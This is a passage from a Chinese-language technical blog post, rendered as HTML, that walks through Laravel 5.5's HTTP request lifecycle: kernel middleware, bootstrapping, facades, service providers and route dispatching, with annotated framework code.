class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述过程主要做的事是将中间件赋值给路由</p><ul><li>中间件顺序优先级列表</li><li>中间件组</li><li>中间件别名</li></ul><p><strong>核心类</strong> <code>app/Http/Kernel.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Http</span>\<span class="title">Kernel</span> <span class="title">as</span> <span class="title">HttpKernel</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Kernel</span> <span class="keyword">extends</span> <span class="title">HttpKernel</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// 全局中间件，最先调用</span></span><br><span class="line">    <span class="keyword">protected</span> $middleware = [</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 检测是否应用是否进入『维护模式』</span></span><br><span class="line">        <span class="comment">// 见：https://d.laravel-china.org/docs/5.5/configuration#maintenance-mode</span></span><br><span class="line">        \Illuminate\Foundation\Http\Middleware\CheckForMaintenanceMode::class,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 检测请求的数据是否过大</span></span><br><span class="line">        \Illuminate\Foundation\Http\Middleware\ValidatePostSize::class,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 对提交的请求参数进行 PHP 函数 `trim()` 处理</span></span><br><span class="line">        \App\Http\Middleware\TrimStrings::class,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将提交请求参数中空子串转换为 null</span></span><br><span class="line">        \Illuminate\Foundation\Http\Middleware\ConvertEmptyStringsToNull::class,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 修正代理服务器后的服务器参数</span></span><br><span class="line">        \App\Http\Middleware\TrustProxies::class,</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义中间件组</span></span><br><span class="line">    <span class="keyword">protected</span> $middlewareGroups = [</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Web 中间件组，应用于 routes/web.php 路由文件</span></span><br><span class="line">        <span class="string">'web'</span> =&gt; [</span><br><span class="line">            <span class="comment">// Cookie 加密解密</span></span><br><span class="line">            \App\Http\Middleware\EncryptCookies::class,</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将 Cookie 添加到响应中</span></span><br><span class="line">            \Illuminate\Cookie\Middleware\AddQueuedCookiesToResponse::class,</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 开启会话</span></span><br><span class="line">            \Illuminate\Session\Middleware\StartSession::class,</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 认证用户，此中间件以后 Auth 类才能生效</span></span><br><span class="line">            <span class="comment">// 见：https://d.laravel-china.org/docs/5.5/authentication</span></span><br><span class="line">            \Illuminate\Session\Middleware\AuthenticateSession::class,</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将系统的错误数据注入到视图变量 $errors 中</span></span><br><span class="line">            \Illuminate\View\Middleware\ShareErrorsFromSession::class,</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 检验 CSRF ，防止跨站请求伪造的安全威胁</span></span><br><span class="line">            <span class="comment">// 见：https://d.laravel-china.org/docs/5.5/csrf</span></span><br><span class="line">            \App\Http\Middleware\VerifyCsrfToken::class,</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 处理路由绑定</span></span><br><span class="line">            <span class="comment">// 见：https://d.laravel-china.org/docs/5.5/routing#route-model-binding</span></span><br><span class="line">            \Illuminate\Routing\Middleware\SubstituteBindings::class,</span><br><span class="line">        ],</span><br><span class="line"></span><br><span class="line">        <span class="comment">// API 中间件组，应用于 routes/api.php 路由文件</span></span><br><span class="line">        <span class="string">'api'</span> =&gt; [</span><br><span class="line">            <span class="comment">// 使用别名来调用中间件</span></span><br><span class="line">            <span class="comment">// 请见：https://d.laravel-china.org/docs/5.5/middleware#为路由分配中间件</span></span><br><span class="line">            <span class="string">'throttle:60,1'</span>,</span><br><span class="line">            <span class="string">'bindings'</span>,</span><br><span class="line">        ],</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 中间件别名设置，允许你使用别名调用中间件，例如上面的 api 中间件组调用</span></span><br><span class="line">    <span class="keyword">protected</span> $routeMiddleware = [</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 只有登录用户才能访问，我们在控制器的构造方法中大量使用</span></span><br><span class="line">        <span class="string">'auth'</span> =&gt; \Illuminate\Auth\Middleware\Authenticate::class,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// HTTP Basic Auth 认证</span></span><br><span class="line">        <span class="string">'auth.basic'</span> =&gt; \Illuminate\Auth\Middleware\AuthenticateWithBasicAuth::class,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 处理路由绑定</span></span><br><span class="line">        <span class="comment">// 见：https://d.laravel-china.org/docs/5.5/routing#route-model-binding</span></span><br><span class="line">        <span class="string">'bindings'</span> =&gt; \Illuminate\Routing\Middleware\SubstituteBindings::class,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 用户授权功能</span></span><br><span class="line">        <span class="string">'can'</span> =&gt; \Illuminate\Auth\Middleware\Authorize::class,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 只有游客才能访问，在 register 和 login 请求中使用，只有未登录用户才能访问这些页面</span></span><br><span class="line">        <span class="string">'guest'</span> =&gt; \App\Http\Middleware\RedirectIfAuthenticated::class,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 访问节流，类似于 『1 分钟只能请求 10 次』的需求，一般在 API 中使用</span></span><br><span class="line">        <span class="string">'throttle'</span> =&gt; \Illuminate\Routing\Middleware\ThrottleRequests::class,</span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-请求实例化"><a href="#2-请求实例化" class="headerlink" title="2. 请求实例化"></a>2. 请求实例化</h2><blockquote><p>以处理 Http 请求为例</p></blockquote><p><code>index.php</code> 入口文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$response = $kernel-&gt;handle(</span><br><span class="line">    $request = Illuminate\Http\Request::capture()</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>请求是通过 <code>Illuminate\Http\Request::capture()</code> 实例化的, 主要是将请求信息以对象形式表现出来</p><h2 id="3-请求处理"><a href="#3-请求处理" class="headerlink" title="3.请求处理"></a>3.请求处理</h2><p><strong>入口文件:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$response = $kernel-&gt;handle(</span><br><span class="line">    $request = Illuminate\Http\Request::capture()</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><code>$kernel-&gt;handle(...)</code> <strong>处理请求过程</strong></p><p><code>Illuminate\Foundation\Http\Kernel</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">handle</span><span class="params">($request)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $request-&gt;enableHttpMethodParameterOverride();</span><br><span class="line"></span><br><span class="line">        $response = <span class="keyword">$this</span>-&gt;sendRequestThroughRouter($request);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;reportException($e);</span><br><span class="line"></span><br><span class="line">        $response = <span class="keyword">$this</span>-&gt;renderException($request, $e);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable $e) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;reportException($e = <span class="keyword">new</span> FatalThrowableError($e));</span><br><span class="line"></span><br><span class="line">        $response = <span class="keyword">$this</span>-&gt;renderException($request, $e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;app[<span class="string">'events'</span>]-&gt;dispatch(</span><br><span class="line">        <span class="keyword">new</span> Events\RequestHandled($request, $response)</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $response;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">sendRequestThroughRouter</span><span class="params">($request)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;app-&gt;instance(<span class="string">'request'</span>, $request);</span><br><span class="line"></span><br><span class="line">    Facade::clearResolvedInstance(<span class="string">'request'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;bootstrap();<span class="comment"># 核心类初始化</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">new</span> Pipeline(<span class="keyword">$this</span>-&gt;app))</span><br><span class="line">        -&gt;send($request)</span><br><span class="line">        -&gt;through(<span class="keyword">$this</span>-&gt;app-&gt;shouldSkipMiddleware() ? [] : <span class="keyword">$this</span>-&gt;middleware)</span><br><span class="line">        -&gt;then(<span class="keyword">$this</span>-&gt;dispatchToRouter());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">dispatchToRouter</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="params">($request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;app-&gt;instance(<span class="string">'request'</span>, $request);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;router-&gt;dispatch($request);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实际处理请求逻辑主要在 <code>sendRequestThroughRouter</code> 方法中, 它主要做了:</p><ul><li><p>核心类的初始化</p></li><li><p>经由中间件过滤后将请求最终交由 <code>Router</code> 处理</p></li></ul><blockquote><p>对于 Http 请求处理, 中间件包括:<br>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> $middleware = [</span><br><span class="line"></span><br><span class="line">   \Illuminate\Foundation\Http\Middleware\CheckForMaintenanceMode::class,</span><br><span class="line"></span><br><span class="line">   \Illuminate\Foundation\Http\Middleware\ValidatePostSize::class,</span><br><span class="line"></span><br><span class="line">    \App\Http\Middleware\TrimStrings::class,</span><br><span class="line"></span><br><span class="line">    \Illuminate\Foundation\Http\Middleware\ConvertEmptyStringsToNull::class,</span><br><span class="line"></span><br><span class="line">   \App\Http\Middleware\TrustProxies::class,</span><br><span class="line"></span><br><span class="line">];</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>该中间件数组定义在 Http 核心类中, 同时在核心类的构造函数中传递给 Router 类</p></blockquote><h3 id="3-1-请求处理环境初始化"><a href="#3-1-请求处理环境初始化" class="headerlink" title="3.1 请求处理环境初始化"></a>3.1 请求处理环境初始化</h3><p><strong>核心类的初始化</strong> <code>bootstrap()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> $bootstrappers = [</span><br><span class="line">    \Illuminate\Foundation\Bootstrap\LoadEnvironmentVariables::class,</span><br><span class="line">    \Illuminate\Foundation\Bootstrap\LoadConfiguration::class,</span><br><span class="line">    \Illuminate\Foundation\Bootstrap\HandleExceptions::class,</span><br><span class="line">    \Illuminate\Foundation\Bootstrap\RegisterFacades::class,</span><br><span class="line">    \Illuminate\Foundation\Bootstrap\RegisterProviders::class,</span><br><span class="line">    \Illuminate\Foundation\Bootstrap\BootProviders::class,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">bootstrap</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">$this</span>-&gt;app-&gt;hasBeenBootstrapped()) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;app-&gt;bootstrapWith(<span class="keyword">$this</span>-&gt;bootstrappers());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">bootstrappers</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;bootstrappers;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在服务容器 <code>Application</code> 类中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">bootstrapWith</span><span class="params">(array $bootstrappers)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;hasBeenBootstrapped = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($bootstrappers <span class="keyword">as</span> $bootstrapper) &#123;</span><br><span class="line">        <span class="keyword">$this</span>[<span class="string">'events'</span>]-&gt;fire(<span class="string">'bootstrapping: '</span>.$bootstrapper, [<span class="keyword">$this</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;make($bootstrapper)-&gt;bootstrap(<span class="keyword">$this</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>[<span class="string">'events'</span>]-&gt;fire(<span class="string">'bootstrapped: '</span>.$bootstrapper, [<span class="keyword">$this</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该步骤主要是主要是对核心类中定义的 <code>$bootstrappers</code> 数组元素(引导类)初始化.</p><blockquote><p>bootstrap 过程具体是在服务容器来中进行, 由核心类调用并传入待初始化的类</p></blockquote><p>Http 核心类默认包含以下 6 个启动服务:</p><ul><li>环境监测  <code>\Illuminate\Foundation\Bootstrap\LoadEnvironmentVariables::class</code></li></ul><p>从 <code>.env</code> 文件中解析环境变量到 <code>getevn()</code>, <code>$_ENV</code>, <code>$_SERVER</code>, 依赖 <code>vlucas/phpdotenv</code> 扩展包</p><ul><li>配置加载 <code>\Illuminate\Foundation\Bootstrap\LoadConfiguration::class</code></li></ul><p>载入 <code>config</code> 目录下所有 php 配置文件, 并将生成的配置存储类绑定到服务容器 <code>$app[&#39;config&#39;]</code></p><p>同时配置时区及 多字节格式(utf8)</p><ul><li>异常处理 <code>\Illuminate\Foundation\Bootstrap\HandleExceptions::class</code></li></ul><p>报告所有错误 <code>error_report(E_ALL)</code></p><p>提供对未捕获的异常, 错误的全局处理 <code>set_error_handler</code>, <code>set_exception_handler</code>, <code>register_shutdown_function</code></p><ul><li>外观注册 <code>\Illuminate\Foundation\Bootstrap\RegisterFacades::class</code></li></ul><p>从 <code>app.aliases</code> 中读取外观配置数组</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'aliases'</span> =&gt; [</span><br><span class="line"></span><br><span class="line">        <span class="string">'App'</span> =&gt; Illuminate\Support\Facades\App::class,</span><br><span class="line">        <span class="string">'Artisan'</span> =&gt; Illuminate\Support\Facades\Artisan::class,</span><br><span class="line">        <span class="string">'Auth'</span> =&gt; Illuminate\Support\Facades\Auth::class,</span><br><span class="line">        <span class="string">'Blade'</span> =&gt; Illuminate\Support\Facades\Blade::class,</span><br><span class="line">        <span class="string">'Broadcast'</span> =&gt; Illuminate\Support\Facades\Broadcast::class,</span><br><span class="line">        <span class="string">'Bus'</span> =&gt; Illuminate\Support\Facades\Bus::class,</span><br><span class="line">        <span class="string">'Cache'</span> =&gt; Illuminate\Support\Facades\Cache::class,</span><br><span class="line">        <span class="string">'Config'</span> =&gt; Illuminate\Support\Facades\Config::class,</span><br><span class="line">        <span class="string">'Cookie'</span> =&gt; Illuminate\Support\Facades\Cookie::class,</span><br><span class="line">        <span class="string">'Crypt'</span> =&gt; Illuminate\Support\Facades\Crypt::class,</span><br><span class="line">        <span class="string">'DB'</span> =&gt; Illuminate\Support\Facades\DB::class,</span><br><span class="line">        <span class="string">'Eloquent'</span> =&gt; Illuminate\Database\Eloquent\Model::class,</span><br><span class="line">        <span class="string">'Event'</span> =&gt; Illuminate\Support\Facades\Event::class,</span><br><span class="line">        <span class="string">'File'</span> =&gt; Illuminate\Support\Facades\File::class,</span><br><span class="line">        <span class="string">'Gate'</span> =&gt; Illuminate\Support\Facades\Gate::class,</span><br><span class="line">        <span class="string">'Hash'</span> =&gt; Illuminate\Support\Facades\Hash::class,</span><br><span class="line">        <span class="string">'Lang'</span> =&gt; Illuminate\Support\Facades\Lang::class,</span><br><span class="line">        <span class="string">'Log'</span> =&gt; Illuminate\Support\Facades\Log::class,</span><br><span class="line">        <span class="string">'Mail'</span> =&gt; Illuminate\Support\Facades\Mail::class,</span><br><span class="line">        <span class="string">'Notification'</span> =&gt; Illuminate\Support\Facades\Notification::class,</span><br><span class="line">        <span class="string">'Password'</span> =&gt; Illuminate\Support\Facades\Password::class,</span><br><span class="line">        <span class="string">'Queue'</span> =&gt; Illuminate\Support\Facades\Queue::class,</span><br><span class="line">        <span class="string">'Redirect'</span> =&gt; Illuminate\Support\Facades\Redirect::class,</span><br><span class="line">        <span class="string">'Redis'</span> =&gt; Illuminate\Support\Facades\Redis::class,</span><br><span class="line">        <span class="string">'Request'</span> =&gt; Illuminate\Support\Facades\Request::class,</span><br><span class="line">        <span class="string">'Response'</span> =&gt; Illuminate\Support\Facades\Response::class,</span><br><span class="line">        <span class="string">'Route'</span> =&gt; Illuminate\Support\Facades\Route::class,</span><br><span class="line">        <span class="string">'Schema'</span> =&gt; Illuminate\Support\Facades\Schema::class,</span><br><span class="line">        <span class="string">'Session'</span> =&gt; Illuminate\Support\Facades\Session::class,</span><br><span class="line">        <span class="string">'Storage'</span> =&gt; Illuminate\Support\Facades\Storage::class,</span><br><span class="line">        <span class="string">'URL'</span> =&gt; Illuminate\Support\Facades\URL::class,</span><br><span class="line">        <span class="string">'Validator'</span> =&gt; Illuminate\Support\Facades\Validator::class,</span><br><span class="line">        <span class="string">'View'</span> =&gt; Illuminate\Support\Facades\View::class,</span><br><span class="line"></span><br><span class="line">    ],</span><br></pre></td></tr></table></figure><p>使用 <code>spl_autoload_register(...)</code> 处理类加载, 配合 <code>class_alias()</code> 提供类的别名调用</p><p>Facade<code>外观类基类依赖</code>__callStatic` 调用方法( 使用服务容器实例化对应类)</p><ul><li>服务提供者注册 <code>\Illuminate\Foundation\Bootstrap\RegisterProviders::class</code></li></ul><p>从 <code>app.providers</code> 中读取所有服务提供者</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'providers'</span> =&gt; [</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Laravel Framework Service Providers...</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        Illuminate\Auth\AuthServiceProvider::class,</span><br><span class="line">        Illuminate\Broadcasting\BroadcastServiceProvider::class,</span><br><span class="line">        Illuminate\Bus\BusServiceProvider::class,</span><br><span class="line">        Illuminate\Cache\CacheServiceProvider::class,</span><br><span class="line">        Illuminate\Foundation\Providers\ConsoleSupportServiceProvider::class,</span><br><span class="line">        Illuminate\Cookie\CookieServiceProvider::class,</span><br><span class="line">        Illuminate\Database\DatabaseServiceProvider::class,</span><br><span class="line">        Illuminate\Encryption\EncryptionServiceProvider::class,</span><br><span class="line">        Illuminate\Filesystem\FilesystemServiceProvider::class,</span><br><span class="line">        Illuminate\Foundation\Providers\FoundationServiceProvider::class,</span><br><span class="line">        Illuminate\Hashing\HashServiceProvider::class,</span><br><span class="line">        Illuminate\Mail\MailServiceProvider::class,</span><br><span class="line">        Illuminate\Notifications\NotificationServiceProvider::class,</span><br><span class="line">        Illuminate\Pagination\PaginationServiceProvider::class,</span><br><span class="line">        Illuminate\Pipeline\PipelineServiceProvider::class,</span><br><span class="line">        Illuminate\Queue\QueueServiceProvider::class,</span><br><span class="line">        Illuminate\Redis\RedisServiceProvider::class,</span><br><span class="line">        Illuminate\Auth\Passwords\PasswordResetServiceProvider::class,</span><br><span class="line">        Illuminate\Session\SessionServiceProvider::class,</span><br><span class="line">        Illuminate\Translation\TranslationServiceProvider::class,</span><br><span class="line">        Illuminate\Validation\ValidationServiceProvider::class,</span><br><span class="line">        Illuminate\View\ViewServiceProvider::class,</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Package Service Providers...</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Application Service Providers...</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        App\Providers\AppServiceProvider::class,</span><br><span class="line">        App\Providers\AuthServiceProvider::class,</span><br><span class="line">        <span class="comment">// App\Providers\BroadcastServiceProvider::class,</span></span><br><span class="line">        App\Providers\EventServiceProvider::class,</span><br><span class="line">        App\Providers\RouteServiceProvider::class,<span class="comment"># 路由表生成</span></span><br><span class="line">    ],</span><br></pre></td></tr></table></figure><p>服务提供者经过解析后分为 3 种类型的服务提供者:</p><pre><code>- eager 类型</code></pre><p>马上调用 <code>register</code> 注册</p><pre><code>- deferred 类型</code></pre><p>记录下来, 当服务容器解析对应服务时, 才注册对应的服务提供者</p><pre><code>- when 类型</code></pre><p>记录下来, 当对应 event 触发时在注册对应服务提供者</p><ul><li>启动提供者 <code>\Illuminate\Foundation\Bootstrap\BootProviders::class</code></li></ul><p>调用服务容器的 <code>boot()</code> 方法, 依次调用在服务容器中 <code>register</code> 的所有服务提供者的 <code>boot()</code> 方法</p><h3 id="3-2-路由处理请求"><a href="#3-2-路由处理请求" class="headerlink" title="3.2 路由处理请求"></a>3.2 路由处理请求</h3><p>在内核处理请求, 将请求实例通过中间件处理后, 将请求的处理交给路由 Router 进行控制器的分发.</p><blockquote><p>Http Kernel</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">dispatchToRouter</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="params">($request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;app-&gt;instance(<span class="string">'request'</span>, $request);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;router-&gt;dispatch($request);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>路由表存储结构说明</p><p><code>Illuminate\Routing\Route</code> 存储单条路由</p><p><code>Illuminate\Routing\RouteCollection</code> 保存所有 <code>Route</code> 实例, 形成路由表</p><p><code>Illuminate\Routing\Router</code> 类实例持有 <code>RouteCollection</code> 路由表实例.</p><p>即, 一个 <code>Router</code> 持有一个 <code>RouteCollection</code>, 而 <code>RouteCollection</code> 拥有 N 个 <code>Route</code></p><p>在 <code>Router</code> 中对请求的处理同样经过一系列的 <strong>路由中间件</strong></p><figure 